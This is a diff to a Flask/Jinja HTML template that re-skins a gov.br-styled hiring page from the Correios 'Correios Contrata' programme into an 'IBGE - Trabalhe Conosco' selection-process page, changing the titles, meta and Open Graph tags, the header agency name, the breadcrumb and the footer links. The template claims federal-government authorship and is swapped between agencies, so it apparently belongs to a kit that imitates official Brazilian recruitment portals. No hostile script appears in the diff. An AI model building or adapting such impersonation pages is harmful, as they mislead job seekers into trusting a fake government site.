@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{% block title %}Correios Contrata - gov.br{% endblock %}</title>
+    <title>{% block title %}IBGE - Trabalhe Conosco - gov.br{% endblock %}</title>
     
     <!-- Font Awesome Icons - Local fallback for better performance -->
     <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
@@ -34,13 +34,13 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
     
     <!-- SEO and Meta Tags -->
-    <meta name="description" content="{% block description %}Programa Correios Contrata - Governo Federal{% endblock %}">
-    <meta name="keywords" content="correios, logística, carteiro, funcionários públicos, vagas públicas">
+    <meta name="description" content="{% block description %}IBGE Trabalhe Conosco - Processo Seletivo Simplificado - Governo Federal{% endblock %}">
+    <meta name="keywords" content="ibge, geografia, estatística, pesquisa, mapeamento, concurso público, vagas públicas">
     <meta name="author" content="Governo Federal do Brasil">
     
     <!-- Open Graph -->
-    <meta property="og:title" content="{% block og_title %}Correios Contrata - gov.br{% endblock %}">
-    <meta property="og:description" content="{% block og_description %}Programa Correios Contrata do Governo Federal{% endblock %}">
+    <meta property="og:title" content="{% block og_title %}IBGE - Trabalhe Conosco - gov.br{% endblock %}">
+    <meta property="og:description" content="{% block og_description %}Processo Seletivo Simplificado IBGE 2025 - Instituto Brasileiro de Geografia e Estatística{% endblock %}">
     <meta property="og:type" content="website">
     <meta property="og:url" content="{{ request.url }}">
     
@@ -113,7 +113,7 @@
                 <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
                     <i class="fas fa-bars text-blue-900 mr-3"></i>
                 </button>
-                <span class="text-gray-800 text-sm font-medium">Empresa Brasileira de Correios e Telégrafos</span>
+                <span class="text-gray-800 text-sm font-medium">Instituto Brasileiro de Geografia e Estatística</span>
             </div>
             <div class="flex items-center">
                 <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
@@ -131,7 +131,7 @@
                 <div class="relative flex-1">
                     <input type="text" 
                            id="header-search-input" 
-                           placeholder="Buscar programas, vagas, ministérios..." 
+                           placeholder="Buscar processos seletivos, pesquisas, dados estatísticos..." 
                            class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
                     <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
                         <i class="fas fa-search"></i>
@@ -160,7 +160,7 @@
                 <span class="mx-1 text-gray-600">></span>
                 <a href="{{ url_for('lista_programas') }}" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a>
                 <span class="mx-1 text-gray-600">></span>
-                <span class="text-gray-800 text-xs font-medium">Correios Contrata</span>
+                <span class="text-gray-800 text-xs font-medium">IBGE - Trabalhe Conosco</span>
             </div>
         </nav>
     </header>
@@ -189,17 +189,17 @@
             <nav aria-label="Menu principal do rodapé">
                 <ul>
                     <li class="py-3">
-                        <a href="#" class="text-sm hover:text-gray-300">MEC</a>
+                        <a href="#" class="text-sm hover:text-gray-300">IBGE</a>
                     </li>
                     <li class="border-t border-gray-600 py-3 flex justify-between items-center">
-                        <a href="#" class="text-sm hover:text-gray-300">SERVIÇOS POSTAIS</a>
-                        <button class="footer-expand-btn" aria-label="Expandir seção Serviços Postais">
+                        <a href="#" class="text-sm hover:text-gray-300">GEOGRAFIA E ESTATÍSTICA</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Geografia e Estatística">
                             <i class="fas fa-chevron-down text-xs"></i>
                         </button>
                     </li>
                     <li class="border-t border-gray-600 py-3 flex justify-between items-center">
-                        <a href="#" class="text-sm hover:text-gray-300">ENSINO SUPERIOR</a>
-                        <button class="footer-expand-btn" aria-label="Expandir seção Ensino Superior">
+                        <a href="#" class="text-sm hover:text-gray-300">PESQUISAS E CENSOS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Pesquisas e Censos">
                             <i class="fas fa-chevron-down text-xs"></i>
                         </button>
                     </li>
